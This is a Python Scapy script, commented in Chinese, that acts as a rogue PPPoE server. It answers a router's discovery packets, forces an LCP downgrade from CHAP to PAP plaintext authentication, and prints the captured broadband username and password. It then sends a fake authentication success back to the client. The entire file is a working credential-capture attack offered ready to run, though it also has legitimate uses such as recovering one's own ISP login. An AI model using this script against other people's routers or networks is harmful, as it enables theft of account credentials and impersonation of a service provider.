import time
import struct
from scapy.all import sniff, sendp, get_if_hwaddr, conf
from scapy.layers.l2 import Ether
from scapy.layers.ppp import PPPoED, PPPoE, PPP, PPPoETag

# ================= 配置区 =================
INTERFACE = "en10"  # 你的网卡名称，None 为默认
AC_NAME = b"Python-vBNG-Server"
# 我们为客户端分配的固定 Session ID
SESS_ID = 0x8899  
# ==========================================

# 状态记录
client_mac = None
server_mac = None
credentials_captured = False

def handle_packet(packet):
    global client_mac, server_mac, credentials_captured

    # ----------------------------------------------------
    # 阶段 1: PPPoE Discovery (0x8863)
    # ----------------------------------------------------
    if packet.haslayer(PPPoED):
        pppoe_d = packet[PPPoED]
        eth = packet[Ether]

        # 收到 PADI -> 回复 PADO
        if pppoe_d.code == 0x09:
            client_mac = eth.src
            try:
                server_mac = get_if_hwaddr(INTERFACE or conf.iface)
            except:
                server_mac = "AA:BB:CC:DD:EE:FF"
            
            print(f"\n[1] 收到 PADI (MAC: {client_mac}) -> 发送 PADO")
            tag_ac = PPPoETag(tag_type=0x0102, tag_value=AC_NAME)
            pado = Ether(dst=client_mac, src=server_mac, type=0x8863) / \
                   PPPoED(version=1, type=1, code=0x07, sessionid=0) / tag_ac
            if packet.payload: pado = pado / pppoe_d.payload
            sendp(pado, iface=INTERFACE, verbose=False)

        # 收到 PADR -> 回复 PADS (确立 Session ID)
        elif pppoe_d.code == 0x19:
            print(f"[2] 收到 PADR -> 发送 PADS (分配 Session ID: {hex(SESS_ID)})")
            pads = Ether(dst=client_mac, src=server_mac, type=0x8863) / \
                   PPPoED(version=1, type=1, code=0x65, sessionid=SESS_ID)
            if packet.payload: pads = pads / pppoe_d.payload
            sendp(pads, iface=INTERFACE, verbose=False)
            print("[*] Discovery 阶段完成，进入 PPP Session (0x8864) 阶段...")

    # ----------------------------------------------------
    # 阶段 2: PPP Session (0x8864)
    # ----------------------------------------------------
    elif packet.haslayer(PPPoE) and packet.haslayer(PPP):
        # 确保是我们刚才分配的 Session
        if packet[PPPoE].sessionid != SESS_ID:
            return

        ppp_proto = packet[PPP].proto
        raw_payload = bytes(packet[PPP].payload) # 获取 PPP 内部的原始字节流
        
        if not raw_payload:
            return

        # 1. LCP (链路控制协议) 协商
        if ppp_proto == 0xc021:
            lcp_code = raw_payload[0]
            
            # 收到客户端的 LCP Configure-Request
            if lcp_code == 1: 
                print("\n[3] 收到客户端 LCP 协商请求")
                
                # 动作 A: 同意客户端的所有请求 (发回 Configure-Ack)
                ack_payload = bytearray(raw_payload)
                ack_payload[0] = 2 # 改为 Ack (2)
                lcp_ack = Ether(dst=client_mac, src=server_mac, type=0x8864) / \
                          PPPoE(sessionid=SESS_ID) / PPP(proto=0xc021) / bytes(ack_payload)
                sendp(lcp_ack, iface=INTERFACE, verbose=False)
                print("    -> 回复 LCP Configure-Ack")

                # 动作 B: 提出我们服务端的请求，强制要求使用 PAP 认证！
                # 构造: Code=1(Req), ID=1, 长度=8, 选项3(Auth), 选项长度4, 协议0xC023(PAP)
                req_payload = struct.pack("!BBHBBH", 1, 1, 8, 3, 4, 0xc023)
                lcp_req = Ether(dst=client_mac, src=server_mac, type=0x8864) / \
                          PPPoE(sessionid=SESS_ID) / PPP(proto=0xc021) / req_payload
                sendp(lcp_req, iface=INTERFACE, verbose=False)
                print("    -> 发送 LCP Configure-Request (强制要求 PAP 明文认证)")

        # 2. PAP 认证协议 (如果客户端接受了我们的 LCP，就会发这个)
        elif ppp_proto == 0xc023:
            pap_code = raw_payload[0]
            
            # 收到 PAP Authenticate-Request (包含账号密码)
            if pap_code == 1:
                print("\n" + "="*50)
                print("!!! 成功拦截 PAP 认证数据包 !!!")
                print("="*50)
                
                try:
                    # 按照 PAP 协议格式拆解字节流
                    # 格式: Code(1) | ID(1) | Length(2) | UserLen(1) | Username | PassLen(1) | Password
                    user_len = raw_payload[4]
                    username = raw_payload[5 : 5+user_len].decode('utf-8', errors='ignore')
                    
                    pass_len_idx = 5 + user_len
                    pass_len = raw_payload[pass_len_idx]
                    password = raw_payload[pass_len_idx+1 : pass_len_idx+1+pass_len].decode('utf-8', errors='ignore')

                    print(f"[*] 宽带账号 (Username) : {username}")
                    print(f"[*] 宽带密码 (Password) : {password}")
                    print("="*50 + "\n")
                    
                    credentials_captured = True # 标记完成，结束嗅探
                    
                    # (可选) 给客户端回一个认证成功，让它开心一下
                    pap_ack = Ether(dst=client_mac, src=server_mac, type=0x8864) / \
                              PPPoE(sessionid=SESS_ID) / PPP(proto=0xc023) / struct.pack("!BBHB", 2, raw_payload[1], 5, 0)
                    sendp(pap_ack, iface=INTERFACE, verbose=False)
                    
                except Exception as e:
                    print(f"[!] PAP 解析错误: {e}")

        # 如果客户端顽固地发了 CHAP (0xc223)，说明它拒绝降级 PAP
        elif ppp_proto == 0xc223:
            print("\n[!] 收到 CHAP 数据包。客户端拒绝降级 PAP，密码被 MD5 散列隐藏了！")
            credentials_captured = True # 依然结束脚本

def stop_condition(packet):
    return credentials_captured

if __name__ == "__main__":
    print(f"[*] 启动高级 PPPoE 服务端模拟器 (PAP 明文嗅探模式) ...")
    print(f"[*] 正在监听，等待路由器发起拨号...")
    
    try:
        # 注意：这里的 filter 增加了 0x8864，以便监听 Session 数据！
        sniff(
            iface=INTERFACE, 
            filter="ether proto 0x8863 or ether proto 0x8864", 
            prn=handle_packet, 
            stop_filter=stop_condition,
            store=0
        )
        print("[*] 任务完成，脚本退出。")
    except Exception as e:
        print(f"\n[!] 发生错误: {e}")